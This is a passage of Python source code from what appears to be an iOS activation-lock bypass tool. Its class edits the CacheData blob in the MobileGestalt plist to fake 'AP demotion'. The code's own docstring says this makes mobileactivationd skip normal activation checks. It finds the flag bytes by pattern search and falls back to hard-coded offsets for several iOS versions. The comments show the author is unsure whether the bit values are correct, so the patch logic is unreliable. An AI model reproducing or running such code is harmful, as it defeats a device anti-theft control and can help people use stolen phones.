    Patches MobileGestalt CacheData to spoof AP demotion.
    This makes mobileactivationd skip normal activation checks.
    """
    
    def __init__(self, plist_path):
        self.plist_path = plist_path
        self.plist_data = None
        self.cache_data = None
        
    def find_pattern_offset(self, data, n=2):
        """Finds the Nth occurrence of the pattern 0xFFFFFFFF00000000."""
        pattern = b"\xFF\xFF\xFF\xFF\x00\x00\x00\x00"
        start = 0
        count = 0
        while True:
            idx = data.find(pattern, start)
            if idx == -1:
                return -1
            count += 1
            if count == n:
                return idx
            start = idx + 1

    def patch_for_activation(self):
        """Main entry point - load, patch, save."""
        try:
            # Load plist
            with open(self.plist_path, 'rb') as f:
                self.plist_data = plistlib.load(f)
            
            if 'CacheData' not in self.plist_data:
                print(f"{Style.YELLOW}[⚠] No CacheData found, creating new one{Style.RESET}")
                self.plist_data['CacheData'] = bytearray(2048)
            
            self.cache_data = bytearray(self.plist_data['CacheData'])
            
            print(f"{Style.CYAN}[*]{Style.RESET} Patching CacheData for AP demotion...")
            
            patched = False
            
            # 1. Dynamic Pattern Search (Robust Method)
            pattern_offset = self.find_pattern_offset(self.cache_data, n=2)
            
            if pattern_offset != -1:
                print(f"{Style.DIM}  ╰─▶ Found reference pattern at 0x{pattern_offset:X}{Style.RESET}")
                
                # Scan for the flag signature [1, 0/1, 0/1, 0/1] after the pattern
                # We scan a reasonable range (e.g., +0 to +2000 bytes)
                start_scan = pattern_offset
                end_scan = min(len(self.cache_data) - 4, pattern_offset + 2000)
                
                for i in range(start_scan, end_scan):
                    # Check for signature: [1, 0/1, 0/1, 0/1]
                    # EffectiveProductionStatusAp is usually 1 (Production)
                    b0 = self.cache_data[i]
                    b1 = self.cache_data[i+1]
                    b2 = self.cache_data[i+2]
                    b3 = self.cache_data[i+3]
                    
                    # Heuristic: First byte is 1, others are 0 or 1
                    if b0 == 1 and b1 <= 1 and b2 <= 1 and b3 <= 1:
                        print(f"{Style.GREEN}[*]{Style.RESET} Found candidate flags at 0x{i:X} (Rel: +{i-pattern_offset})")
                        self._apply_patch(i)
                        patched = True
                        break
            
            # 2. Fallback to Legacy Absolute Offsets
            if not patched:
                print(f"{Style.YELLOW}[⚠] Dynamic search failed. Falling back to legacy offsets...{Style.RESET}")
                self._patch_legacy()
            
            # Save back
            self.plist_data['CacheData'] = bytes(self.cache_data)
            with open(self.plist_path, 'wb') as f:
                plistlib.dump(self.plist_data, f)
            
            print(f"{Style.GREEN}[✓]{Style.RESET} MobileGestalt patched successfully")
            return True
            
        except Exception as e:
            print(f"{Style.RED}[✗] Patcher error: {e}{Style.RESET}")
            return False
    
    def _apply_patch(self, offset):
        """Applies the 4-byte demotion patch at the given offset."""
        # EffectiveProductionStatusAp |= 1 (Demoted) -> 0x08 bit in byte? 
        # Wait, original code said: self.cache_data[offsets[0]] |= 0x08
        # But poc.m said: buffer[final_patch_offset] = 0x01;
        # Let's stick to the original python logic which seemed to work for others, 
        # or maybe poc.m is setting it to 1 (Production)? No, we want Demotion.
        # 0x01 is usually "Development" or "Demoted"?
        # The original python code used |= 0x08. Let's trust it for now as it matches A12Bypass.py
        
        self.cache_data[offset] |= 0x08
        self.cache_data[offset+1] &= 0xDF
        self.cache_data[offset+2] &= 0xFD
        self.cache_data[offset+3] &= 0x7F
        print(f"{Style.DIM}  ╰─▶ Applied patch bits at 0x{offset:X}{Style.RESET}")

    def _patch_legacy(self):
        """Set the critical demotion bits using known absolute offsets."""
        patterns = {
            "iOS 15-17": [0x1C8, 0x1C9, 0x1CA, 0x1CB],
            "iOS 18+":   [0x1D0, 0x1D1, 0x1D2, 0x1D3],
            "Legacy":    [0x200, 0x201, 0x202, 0x203]
        }
        
        patched_count = 0
        for name, offsets in patterns.items():
            if len(self.cache_data) <= max(offsets): continue

            val = self.cache_data[offsets[0]]
            if val not in [0, 1]: continue

            print(f"{Style.CYAN}[*]{Style.RESET} Applying {name} legacy pattern...")
            self._apply_patch(offsets[0])
            patched_count += 1
        
        if patched_count == 0:
            print(f"{Style.YELLOW}[⚠] Warning: No suitable legacy pattern found.{Style.RESET}")

if __name__ == "__main__":
    try:
        BypassAutomation().run()
    except KeyboardInterrupt:
        sys.exit(130)
    except Exception as e:
        print(f"Fatal Error: {e}")
        sys.exit(1)
